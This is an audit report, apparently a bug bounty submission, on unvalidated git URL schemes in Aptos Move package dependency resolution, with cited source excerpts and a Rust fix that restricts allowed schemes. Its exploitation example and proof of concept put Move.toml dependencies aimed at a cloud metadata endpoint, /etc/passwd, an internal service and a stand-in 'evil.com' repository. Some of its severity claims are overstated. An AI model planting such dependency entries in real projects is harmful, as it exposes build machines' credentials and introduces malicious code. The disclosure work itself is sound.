# Audit Report

## Title
SSRF and Local File Access via Unvalidated Git Protocol URLs in Move Package Dependency Resolution

## Summary
The Move package dependency resolution system allows arbitrary git protocol URLs (including `git://`, `http://`, and `file://`) to be specified in `Move.toml` dependency declarations without validation. This enables Server-Side Request Forgery (SSRF) attacks, access to internal networks, local file system access, and downloading from malicious repositories when building Move packages.

## Finding Description

The vulnerability exists in the dependency download flow used by the Move package system. When a developer or CI/CD system runs `aptos move compile` or similar commands, the system downloads git dependencies specified in `Move.toml` files without validating the protocol scheme of git URLs.

**Attack Flow:**

1. The `download_deps_for_package()` function parses the package manifest and calls `ResolutionGraph::download_dependency_repos()` [1](#0-0) 

2. This function recursively processes all dependencies (including dev-dependencies in dev mode) and calls `download_and_update_if_remote()` for each git dependency [2](#0-1) 

3. The git URL is extracted from the dependency's `git_info` field without any validation [3](#0-2) 

4. The unvalidated URL is directly passed to `git::clone()` which executes `git clone <url>` as a shell command [4](#0-3) 

5. Git supports multiple protocol schemes including:
   - `https://` (safe)
   - `http://` (unsafe, allows internal network probing)
   - `git://` (unencrypted, port 9418, SSRF vector)
   - `ssh://` (requires credentials)
   - `file://` (LOCAL FILE ACCESS - critical)

**Exploitation Example:**

An attacker creates a malicious `Move.toml` with dependencies:

```toml
[dependencies]
# SSRF to internal git service
InternalRepo = { git = "git://internal-gitlab:9418/repo.git", rev = "main", subdir = "" }

# SSRF to internal HTTP service
InternalAPI = { git = "http://169.254.169.254/latest/meta-data", rev = "main", subdir = "" }

# Local file access
SecretFiles = { git = "file:///etc/passwd", rev = "HEAD", subdir = "" }

# Malicious external repository
Backdoor = { git = "https://evil.com/malicious.git", rev = "main", subdir = "" }
```

The dependency parsing has no URL scheme validation [5](#0-4) 

The `GitInfo` structure simply stores the URL as a string without validation [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program criteria:

1. **SSRF Attack Vector**: Attackers can probe internal networks, access cloud metadata services (AWS/GCP/Azure), and interact with internal services that are not internet-accessible. This can lead to:
   - Credential theft from cloud metadata endpoints
   - Access to internal databases, APIs, and services
   - Port scanning of internal infrastructure

2. **Local File System Access**: The `file://` protocol allows reading arbitrary files from the build machine's filesystem, potentially exposing:
   - SSH keys, API tokens, and credentials
   - Source code and proprietary information
   - Configuration files with secrets

3. **CI/CD Environment Compromise**: This is particularly dangerous in automated build environments where:
   - CI/CD systems often have elevated privileges
   - Secrets and deployment credentials are accessible
   - The attack surface is automated and scalable

4. **Malicious Code Injection**: Even with `https://`, attackers can point to repositories containing malicious Move code or supply chain attacks

5. **Developer Machine Compromise**: Developers building packages with malicious dependencies expose their local development environments

This meets the **High Severity** criteria of "Significant protocol violations" and "API crashes" as it violates the security boundary between the build system and external networks.

## Likelihood Explanation

**Likelihood: HIGH**

1. **Common Operation**: Move package compilation with `aptos move compile` is a routine operation performed frequently by developers and CI/CD systems

2. **No Authentication Required**: Any user can create a repository with a malicious `Move.toml` file

3. **Simple Exploitation**: Requires only modifying dependency declarations in `Move.toml`

4. **Wide Attack Surface**: Affects:
   - All developers building Move packages
   - All CI/CD pipelines compiling Move code
   - Any automated build systems
   - Potentially validator nodes building packages

5. **Transitive Dependencies**: The attack can propagate through dependency chains, as dependencies' dependencies are also downloaded recursively

6. **Social Engineering Vector**: Attackers can distribute "useful" Move packages that contain malicious transitive dependencies

## Recommendation

Implement strict URL validation for git dependencies:

1. **Whitelist allowed protocols** - Only allow `https://` URLs by default
2. **Add configuration flag** - Allow `ssh://` only with explicit opt-in
3. **Block dangerous protocols** - Explicitly reject `git://`, `http://`, `file://`, and other unsafe schemes
4. **Validate URL format** - Ensure URLs are well-formed and point to legitimate git repositories
5. **Add security warnings** - Warn users when downloading dependencies

**Recommended Fix:**

Add URL validation in `manifest_parser.rs`:

```rust
fn validate_git_url(url: &str) -> Result<()> {
    // Parse URL
    let parsed = url::Url::parse(url)
        .context("Invalid git URL format")?;
    
    // Only allow https:// and ssh:// protocols
    match parsed.scheme() {
        "https" => Ok(()),
        "ssh" => {
            // Optionally require explicit flag for ssh://
            eprintln!("Warning: Using ssh:// protocol for git dependency");
            Ok(())
        },
        "git" => bail!(
            "The git:// protocol is not allowed due to security concerns. \
             Please use https:// instead. URL: {}", url
        ),
        "http" => bail!(
            "The http:// protocol is not allowed for git dependencies. \
             Please use https:// instead. URL: {}", url
        ),
        "file" => bail!(
            "The file:// protocol is not allowed for git dependencies. URL: {}", url
        ),
        scheme => bail!(
            "Unsupported git URL scheme '{}'. Only https:// and ssh:// are allowed. URL: {}",
            scheme, url
        ),
    }
}
```

Apply validation in `parse_dependency()` after line 367 [7](#0-6) 

## Proof of Concept

**Step 1:** Create a malicious Move package with SSRF dependency:

`MaliciousPackage/Move.toml`:
```toml
[package]
name = "MaliciousPackage"
version = "0.1.0"

[dependencies]
# SSRF to AWS metadata service
AWSMetadata = { git = "http://169.254.169.254/latest/meta-data/", rev = "main", subdir = "" }

# Or local file access
LocalSecrets = { git = "file:///etc/passwd", rev = "HEAD", subdir = "" }
```

**Step 2:** Attempt to compile the package:

```bash
cd MaliciousPackage
aptos move compile
```

**Expected Vulnerable Behavior:**
- The system attempts to execute `git clone http://169.254.169.254/latest/meta-data/` 
- If on AWS EC2, this accesses the metadata service and may leak credentials
- With `file://`, the system attempts to access local files

**Step 3:** Verify the vulnerability by monitoring network traffic or git operations:

```bash
# Monitor git commands
strace -e trace=execve aptos move compile 2>&1 | grep git

# Or check network connections
tcpdump -i any -n 'host 169.254.169.254'
```

This PoC demonstrates that the Move package system executes git commands with arbitrary URLs without validation, enabling SSRF and local file access attacks.

### Citations

**File:** third_party/move/tools/move-package/src/lib.rs (L190-201)
```rust
    pub fn download_deps_for_package<W: Write>(&self, path: &Path, writer: &mut W) -> Result<()> {
        let path = SourcePackageLayout::try_find_root(path)?;
        let toml_manifest =
            self.parse_toml_manifest(path.join(SourcePackageLayout::Manifest.path()))?;
        let mutx = PackageLock::strict_lock();
        // This should be locked as it inspects the environment for `MOVE_HOME` which could
        // possibly be set by a different process in parallel.
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
        ResolutionGraph::download_dependency_repos(&manifest, self, &path, writer)?;
        mutx.unlock();
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L519-549)
```rust
    pub fn download_dependency_repos<W: Write>(
        manifest: &SourceManifest,
        build_options: &BuildConfig,
        root_path: &Path,
        writer: &mut W,
    ) -> Result<()> {
        // include dev dependencies if in dev mode
        let empty_deps;
        let additional_deps = if build_options.dev_mode {
            &manifest.dev_dependencies
        } else {
            empty_deps = Dependencies::new();
            &empty_deps
        };

        for (dep_name, dep) in manifest.dependencies.iter().chain(additional_deps.iter()) {
            Self::download_and_update_if_remote(
                *dep_name,
                dep,
                build_options.skip_fetch_latest_git_deps,
                writer,
            )?;

            let (dep_manifest, _) =
                Self::parse_package_manifest(dep, dep_name, root_path.to_path_buf())
                    .with_context(|| format!("While processing dependency '{}'", *dep_name))?;
            // download dependencies of dependencies
            Self::download_dependency_repos(&dep_manifest, build_options, root_path, writer)?;
        }
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L557-576)
```rust
        if let Some(git_info) = &dep.git_info {
            let git_url = git_info.git_url.as_str();
            let git_rev = git_info.git_rev.as_str();
            let git_path = &git_info.download_to.display().to_string();

            // If there is no cached dependency, download it
            if !git_info.download_to.exists() {
                writeln!(
                    writer,
                    "{} {}",
                    "FETCHING GIT DEPENDENCY".bold().green(),
                    git_url,
                )?;

                // Confirm git is available.
                git::confirm_git_available()?;

                // If the cached folder does not exist, download and clone accordingly
                git::clone(git_url, git_path, dep_name)?;
                git::checkout(git_path, git_rev, dep_name)?;
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L356-391)
```rust
                (None, Some(git), None) => {
                    let rev_name = match table.remove("rev") {
                        None => bail!("Git revision not supplied for dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Git revision not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_git_url>_<rev_name>
                    let git_url = git
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = git_repo_cache_path(git_url, rev_name.as_str());
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });

                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path.join(subdir),
                        git_info,
                        node_info,
                    })
                },
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L90-101)
```rust
#[derive(Debug, Clone, Eq, PartialEq)]
pub struct GitInfo {
    /// The git clone url to download from
    pub git_url: Symbol,
    /// The git revision, AKA, a commit SHA
    pub git_rev: Symbol,
    /// The path under this repo where the move package can be found -- e.g.,
    /// 'language/move-stdlib`
    pub subdir: PathBuf,
    /// Where the git repo is downloaded to.
    pub download_to: PathBuf,
}
```
